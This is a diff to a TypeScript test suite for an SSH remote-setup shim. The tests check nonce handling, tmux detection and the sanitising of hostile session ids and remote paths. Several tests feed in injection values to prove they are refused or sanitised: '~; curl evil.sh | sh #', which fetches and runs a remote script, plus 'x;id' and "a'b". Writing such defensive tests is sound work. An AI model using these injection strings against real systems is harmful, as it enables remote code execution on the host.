@@ -16,12 +16,16 @@ vi.mock('../../../../src/main/conductor-mcp-server', () => ({
 }))
 
 import { ClaudeProvider } from '../../../../src/main/providers/claude'
-import { generateRemoteSetupScript, assertSafeRemotePath, getRemoteSetupCommand } from '../../../../src/main/providers/claude/ssh-shim'
+import { generateRemoteSetupScript, assertSafeRemotePath, getRemoteSetupCommand, buildTmuxBinPatchCommand } from '../../../../src/main/providers/claude/ssh-shim'
+
+// #242 finding F1 (b): generateRemoteSetupScript/getRemoteSetupCommand/
+// configureRemoteSettings now require a nonce.
+const NONCE = 'testnonce123abc'
 
 describe('ClaudeProvider SSH-capable surface', () => {
   it('configureRemoteSettings produces a base64-piped node command', () => {
     const p = new ClaudeProvider()
-    const cmd = p.configureRemoteSettings('sid-x', '~/repo', null)
+    const cmd = p.configureRemoteSettings('sid-x', '~/repo', null, undefined, NONCE)
     expect(cmd).toContain('base64 -d | node')
     // `cd --` defends against a path that begins with a dash being parsed as a flag.
     expect(cmd).toContain('cd -- ~/repo')
@@ -79,19 +83,19 @@ describe('SSH remotePath injection defence', () => {
 
   it('getRemoteSetupCommand throws on a metacharacter-laden remotePath rather than interpolating it', () => {
     expect(() =>
-      getRemoteSetupCommand('sid-x', '~; curl evil.sh | sh #', null),
+      getRemoteSetupCommand('sid-x', '~; curl evil.sh | sh #', null, undefined, NONCE),
     ).toThrow(/Refusing to build SSH setup command/)
   })
 
   it('getRemoteSetupCommand uses `cd --` so a leading-dash path is treated as an operand', () => {
-    const cmd = getRemoteSetupCommand('sid-x', '~/repo', null)
+    const cmd = getRemoteSetupCommand('sid-x', '~/repo', null, undefined, NONCE)
     expect(cmd).toContain(' cd -- ~/repo ')
   })
 })
 
 describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
   it('writes a per-session mcp-config file with the canonical SSE schema and conductor key', () => {
-    const script = generateRemoteSetupScript('sid-x', null)
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
     // Path: ~/.claude/mcp-<sid>.json
     expect(script).toContain(`path.join(claudeDir,'mcp-sid-x.json')`)
     // The mcpConfig literal is JSON-stringified twice (once for the JSON
@@ -111,18 +115,38 @@ describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
   })
 
   it('bakes ?cccSessionId=<encoded sid> into the remote MCP URL (P7.7.10 parity)', () => {
-    const script = generateRemoteSetupScript('sid+with space', null)
+    const script = generateRemoteSetupScript('sid+with space', null, undefined, NONCE)
     // encodeURIComponent maps "+" -> "%2B" and " " -> "%20"
     expect(script).toContain('?cccSessionId=sid%2Bwith%20space')
   })
 
   it('bakes this session\'s per-session token into the remote MCP URL (GHSA-q83v)', () => {
-    const script = generateRemoteSetupScript('sid-x', null)
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
     expect(script).toContain('&token=tok-sid-x')
   })
 
+  // #242 finding F2 (MAJOR, adversarial review round 5): ssh-shim.ts:200
+  // used to interpolate the RAW sessionId into statusLine.command -- the one
+  // embedding that skipped `safeSid`, unlike settings-<safeSid>.json and
+  // mcp-<safeSid>.json below it. Reachability is gated at the IPC boundary
+  // (sessionIdSchema, see pty-handlers-sessionid.test.ts) and this is
+  // hardening on the same footing as the #241 username/host fix, not an
+  // embargoed vulnerability -- but the sink itself must still use safeSid.
+  // Mutation to prove this can fail: revert ssh-shim.ts:200's
+  // `${safeSid}` back to `${sessionId}` -- the raw hostile id then appears
+  // verbatim in the statusLine.command string and this assertion fails.
+  it('never embeds a raw hostile sessionId in statusLine.command -- always the sanitised safeSid', () => {
+    const hostile = 'x;id'
+    const script = generateRemoteSetupScript(hostile, null, undefined, NONCE)
+    const parts = script.split(`Object.assign({},sBase,{`)
+    expect(parts.length).toBeGreaterThanOrEqual(2)
+    const sesCfgBody = parts[1].split('})')[0]
+    expect(sesCfgBody).not.toContain(hostile)
+    expect(sesCfgBody).toContain('CLAUDE_MULTI_SESSION_ID=x_id')
+  })
+
   it('strips BOTH legacy conductor-vision AND conductor entries from shared settings + ~/.claude.json', () => {
-    const script = generateRemoteSetupScript('sid-x', null)
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
     // Shared settings.json: both keys defensively removed
     expect(script).toContain(`s.mcpServers['conductor-vision']`)
     expect(script).toContain(`s.mcpServers['conductor']`)
@@ -134,7 +158,7 @@ describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
   })
 
   it('per-session settings file does NOT carry mcpServers (claude ignores it there)', () => {
-    const script = generateRemoteSetupScript('sid-x', null)
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
     // The clone deletes mcpServers before applying CCC overrides.
     expect(script).toContain(`delete sBase.mcpServers`)
     // sesCfg construction merges sBase + statusLine + (optional hooks); no
@@ -153,7 +177,7 @@ describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
   // omit the statusLine stanza from the per-session settings while leaving
   // the rest of the setup (hooks, mcp, legacy cleanup) intact.
   it('includes the statusLine stanza by default', () => {
-    const script = generateRemoteSetupScript('sid-x', null)
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
     expect(script).toContain(`statusLine:{type:'command'`)
   })
 
@@ -163,19 +187,22 @@ describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
   // command claude runs via `sh -c`, so a raw id with a quote/space/
   // metacharacter is remote code execution / command splitting. It must be the
   // sanitised safeSid (a no-op for real hex ids).
+  // #242 inserts `CCC_TMUX_BIN=...` between the sid and ` node`, so assert on
+  // the sanitised sid token followed by a space (the env-var boundary), not the
+  // literal `<sid> node` adjacency the pre-#242 command had.
   it('embeds the sanitised safeSid — not the raw id — in the statusLine command', () => {
-    const script = generateRemoteSetupScript("a'b", null)
-    expect(script).toContain('CLAUDE_MULTI_SESSION_ID=a_b node')
+    const script = generateRemoteSetupScript("a'b", null, undefined, NONCE)
+    expect(script).toContain('CLAUDE_MULTI_SESSION_ID=a_b ')
     expect(script).not.toContain("CLAUDE_MULTI_SESSION_ID=a'b")
   })
 
   it('leaves a real (hex) id untouched in the statusLine command', () => {
-    const script = generateRemoteSetupScript('9f1f147ea02f2cf7d1eec041', null)
-    expect(script).toContain('CLAUDE_MULTI_SESSION_ID=9f1f147ea02f2cf7d1eec041 node')
+    const script = generateRemoteSetupScript('9f1f147ea02f2cf7d1eec041', null, undefined, NONCE)
+    expect(script).toContain('CLAUDE_MULTI_SESSION_ID=9f1f147ea02f2cf7d1eec041 ')
   })
 
   it('includeStatusLine=false omits the statusLine stanza from the per-session settings', () => {
-    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false })
+    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false }, NONCE)
     const parts = script.split(`Object.assign({},sBase,{`)
     expect(parts.length).toBeGreaterThanOrEqual(2)
     const sesCfgLine = parts[1].split(`})`)[0]
@@ -190,7 +217,7 @@ describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
   // post-upgrade connect inherits it despite the master being off (the
   // shared-file heal runs after the clone is taken).
   it('strips a legacy statusLine stanza from the sBase clone itself', () => {
-    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false })
+    const script = generateRemoteSetupScript('sid-x', null, { includeStatusLine: false }, NONCE)
     expect(script).toContain('delete sBase.statusLine')
     // Ordering: the sBase strip appears before the per-session settings write.
     expect(script.indexOf('delete sBase.statusLine')).toBeLessThan(script.indexOf('sesPath'))
@@ -198,15 +225,15 @@ describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
 
   it('configureRemoteSettings threads the master-switch opts through to the script', () => {
     const p = new ClaudeProvider()
-    const on = p.configureRemoteSettings('sid-x', '~/repo', null)
-    const off = p.configureRemoteSettings('sid-x', '~/repo', null, { includeStatusLine: false })
+    const on = p.configureRemoteSettings('sid-x', '~/repo', null, undefined, NONCE)
+    const off = p.configureRemoteSettings('sid-x', '~/repo', null, { includeStatusLine: false }, NONCE)
     expect(on).not.toBe(off)
   })
 
   // Built-in tools master (onboarding p6): off = empty remote mcpServers,
   // exactly like the port-0 fallback; statusline is independent of this flag.
   it('includeConductorMcp=false writes empty remote mcpServers (no built-in tools)', () => {
-    const script = generateRemoteSetupScript('sid-x', null, { includeConductorMcp: false })
+    const script = generateRemoteSetupScript('sid-x', null, { includeConductorMcp: false }, NONCE)
     const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*",\{mode:0o600,flag:'wx'\}\)/)
     expect(writeMatch).not.toBeNull()
     expect(writeMatch![0]).toContain('\\"mcpServers\\":{}')
@@ -221,7 +248,7 @@ describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
   it('writes empty mcpServers when the conductor server has not bound (port=0)', () => {
     mockedConductorMcpPort = 0
     try {
-      const script = generateRemoteSetupScript('sid-x', null)
+      const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
       const writeMatch = script.match(/fs\.writeFileSync\(mcpPath,"([^"\\]|\\.)*",\{mode:0o600,flag:'wx'\}\)/)
       expect(writeMatch).not.toBeNull()
       // Empty mcpServers literal: {"mcpServers":{}} -> doubly-stringified
@@ -243,7 +270,7 @@ describe('SSH remote setup script (P7.8 -- --mcp-config migration)', () => {
 // each was verified to fail against the pre-fix code.
 describe('SSH remote ~/.claude hardening (GHSA-phr3-g5qh-q4v5)', () => {
   it('re-asserts 0700 on the dir unconditionally, not only on mkdir create', () => {
-    const script = generateRemoteSetupScript('sid-x', null)
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
     // The chmod must be its own statement, so a pre-existing dir is repaired.
     expect(script).toContain('fs.chmodSync(claudeDir,0o700)')
     // And it must come before any write into the dir, so the writes land in an
@@ -252,7 +279,7 @@ describe('SSH remote ~/.claude hardening (GHSA-phr3-g5qh-q4v5)', () => {
   })
 
   it('creates BOTH token-bearing files exclusively (flag wx), refusing a re-planted link', () => {
-    const script = generateRemoteSetupScript('sid-x', null)
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
     // settings-<sid>.json (hook token) and mcp-<sid>.json (?token= secret):
     // exclusive create so a symlink planted in the rmSync->write window is
     // refused with EEXIST rather than followed.
@@ -272,5 +299,111 @@ describe('SSH remote ~/.claude hardening (GHSA-phr3-g5qh-q4v5)', () => {
       'utf8',
     )
     expect(src).not.toContain('the 0700 dir blocks a planted link')
+  })
+})
+
+// #242 finding F3 (MAJOR, adversarial review round 5): after a tier-3/4
+// stage/push succeeds, pty-manager must rewrite the ALREADY-WRITTEN
+// settings-<safeSid>.json's CCC_TMUX_BIN before the claude launch write --
+// see buildTmuxBinPatchCommand's doc comment for the full mechanism.
+//
+// #242 finding F1(a), round-2 correction: buildTmuxBinPatchCommand no longer
+// takes a `tmuxBin` parameter -- the emitted script computes
+// `path.join(os.homedir(),'.claude','bin','tmux')` itself, evaluated on the
+// REMOTE at runtime, rather than trusting a host-supplied value that
+// ultimately traces back to a wire-reported (and therefore
+// attacker-influenceable) path.
+describe('buildTmuxBinPatchCommand (#242 finding F3)', () => {
+  it('produces a base64-piped node command', () => {
+    const cmd = buildTmuxBinPatchCommand('sid-x')
+    expect(cmd).toMatch(/^echo '[A-Za-z0-9+\/=]+' \| base64 -d \| node 2>\/dev\/null$/)
+  })
+
+  it('decodes to a script that reads settings-<safeSid>.json and rewrites CCC_TMUX_BIN in place, computed from the REMOTE os.homedir()', () => {
+    const cmd = buildTmuxBinPatchCommand('sid-x')
+    const m = cmd.match(/echo '([A-Za-z0-9+\/=]+)'/)
+    expect(m).not.toBeNull()
+    const decoded = Buffer.from(m![1], 'base64').toString('utf8')
+    expect(decoded).toContain(`'settings-sid-x.json'`)
+    expect(decoded).toContain('CCC_TMUX_BIN=')
+    expect(decoded).toContain(`path.join(os.homedir(),'.claude','bin','tmux')`)
+    expect(decoded).toContain('statusLine.command')
+  })
+
+  // #242 finding I4: the computed tmuxBin is real remote output
+  // (os.homedir()), not wire-controlled, but its sibling in
+  // generateRemoteSetupScript (the `tmuxPath` guard) re-checks the identical
+  // class of value against the SAME allowlist right before the SAME sink
+  // (statusLine.command) -- this patch script must apply the SAME guard,
+  // and skip the whole patch (leaving whatever CCC_TMUX_BIN was already
+  // baked in) rather than splice an unguarded value into the sink.
+  it('applies the SAME charset guard as generateRemoteSetupScript before splicing tmuxBin into statusLine.command', () => {
+    const cmd = buildTmuxBinPatchCommand('sid-x')
+    const m = cmd.match(/echo '([A-Za-z0-9+\/=]+)'/)
+    const decoded = Buffer.from(m![1], 'base64').toString('utf8')
+    expect(decoded).toContain(`if(!/^[A-Za-z0-9_./-]+$/.test(tmuxBin))tmuxBin=''`)
+    const guardIdx = decoded.indexOf(`if(!/^[A-Za-z0-9_./-]+$/.test(tmuxBin))tmuxBin=''`)
+    const replaceIdx = decoded.indexOf('statusLine.command=')
+    expect(guardIdx).toBeGreaterThan(-1)
+    expect(replaceIdx).toBeGreaterThan(-1)
+    expect(guardIdx).toBeLessThan(replaceIdx)
+    // The replace itself is gated on a non-empty tmuxBin -- a failed guard
+    // must skip the patch entirely, not write an empty CCC_TMUX_BIN=.
+    expect(decoded).toContain(`if(tmuxBin&&s.statusLine&&typeof s.statusLine.command==='string')`)
+  })
+
+  it('sanitizes a hostile sessionId into the same safeSid form the settings filename uses', () => {
+    const cmd = buildTmuxBinPatchCommand('x;id')
+    const m = cmd.match(/echo '([A-Za-z0-9+\/=]+)'/)
+    const decoded = Buffer.from(m![1], 'base64').toString('utf8')
+    expect(decoded).toContain(`'settings-x_id.json'`)
+    expect(decoded).not.toContain('x;id')
+  })
+
+  it('is deterministic for the same input', () => {
+    expect(buildTmuxBinPatchCommand('sid-x')).toBe(
+      buildTmuxBinPatchCommand('sid-x'),
+    )
+  })
+})
+
+// #242 MAJOR: tier 1/2 tmux detection had ZERO coverage -- reverting the
+// entire hunk (dropping both probes, restoring the bare `setup ok\n`
+// sentinel) left the full suite green. Pin each piece individually.
+describe('SSH remote setup script -- tmux detection (#242)', () => {
+  it('probes PATH via the `command -v tmux` shell builtin (tier 1)', () => {
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
+    expect(script).toContain(`execSync('command -v tmux'`)
+  })
+
+  it('falls back to ~/.claude/bin/tmux with an X_OK access check (tier 2)', () => {
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
+    expect(script).toContain(`path.join(claudeDir,'bin','tmux')`)
+    expect(script).toContain('fs.constants.X_OK')
+  })
+
+  it('ends the script with the tmux-carrying sentinel, not the bare "setup ok"', () => {
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
+    // #242 round-3 correction (I3): the sentinel carries a fixed CLASS
+    // (`tmuxClass`), never `tmuxPath` -- there is no wire-reported path left
+    // for tier 1/2 to influence a launch command with.
+    expect(script).toContain(`process.stdout.write('setup ok ${NONCE} tmux='+tmuxClass+'`)
+    // The pre-#242 bare sentinel wrote exactly 'setup ok\n' with nothing
+    // else on the line -- assert that exact literal is gone, not merely
+    // that the new one was added alongside it.
+    expect(script).not.toContain(`process.stdout.write('setup ok\\n')`)
+  })
+})
+
+// #242 MAJOR: the statusline shim's OSC sentinel would otherwise be
+// swallowed by tmux (the pane pty needs allow-passthrough+DCS to forward an
+// unrecognised OSC to the client, which is not configured). The shim
+// instead bypasses tmux by asking the server for the attached client's tty.
+describe('SSH statusline shim -- tmux client-tty bypass (#242)', () => {
+  it('embeds a $TMUX branch that asks the tmux server for #{client_tty}', () => {
+    const script = generateRemoteSetupScript('sid-x', null, undefined, NONCE)
+    expect(script).toContain('process.env.TMUX')
+    expect(script).toContain('#{client_tty}')
+    expect(script).toContain('display-message')
   })
 })
